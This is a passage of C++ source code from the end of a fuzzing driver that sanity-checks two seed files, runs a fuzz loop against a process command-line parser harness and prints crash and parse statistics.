    if (error) {
        std::cerr << "[ProcessCmdLineFuzzer] Failed to create crash directory: " << crashDir << '\n';
        return 1;
    }

    EnsureSeedCorpus(corpusDir);

    static constexpr std::array<std::string_view, 2> kSanitySeeds{
        "seed-process-policy.bin",
        "seed-process-graph.bin",
    };

    for (const auto seedName : kSanitySeeds) {
        const auto seedBytes = ReadFileBytes(corpusDir / seedName);
        if (!seedBytes.has_value()) {
            std::cerr << "[ProcessCmdLineFuzzer] Failed to read sanity seed: " << seedName << '\n';
            return 1;
        }

        const HarnessResult sanity = ProcessCommandLineHarness::Run(*seedBytes);
        if (sanity.crashed || !sanity.parsedOk) {
            std::cerr << "[ProcessCmdLineFuzzer] Sanity check failed for " << seedName;
            if (!sanity.errorMessage.empty()) {
                std::cerr << ": " << sanity.errorMessage;
            }
            if (!sanity.crashSignal.empty()) {
                std::cerr << " (" << sanity.crashSignal << ")";
            }
            std::cerr << '\n';
            return 1;
        }
    }

    FuzzLoopConfig loopConfig = config;
    loopConfig.targetName = std::string(ProcessCommandLineHarness::GetName());

    std::cout << "[ProcessCmdLineFuzzer] Starting process command-line fuzzing...\n";
    std::cout << "[ProcessCmdLineFuzzer] Corpus: " << corpusDir << '\n';
    std::cout << "[ProcessCmdLineFuzzer] Crashes: " << crashDir << '\n';

    FuzzLoop loop(corpusDir, crashDir, ProcessCommandLineHarness::GetHarnessFunction(), loopConfig);
    loop.Run();

    const FuzzStatistics& stats = loop.GetStatistics();
    std::cout << "\n[ProcessCmdLineFuzzer] Final Results:\n";
    std::cout << "  Total iterations: " << stats.totalIterations << '\n';
    std::cout << "  Unique crashes:   " << stats.uniqueCrashes << '\n';
    std::cout << "  Total crashes:    " << stats.crashesFound << '\n';
    std::cout << "  Final corpus:     " << stats.corpusSize << '\n';
    std::cout << "  Parse success:    " << stats.parseSuccesses << '\n';
    std::cout << "  Parse failure:    " << stats.parseFailures << '\n';
    std::cout << "  Duration:         " << stats.durationMs / 1000 << "s\n";
    std::cout << "  Speed:            " << stats.iterationsPerSecond << " iter/s\n";

    return (stats.uniqueCrashes == 0) ? 0 : 2;
}

}  // namespace ShadowStrike::Fuzzer
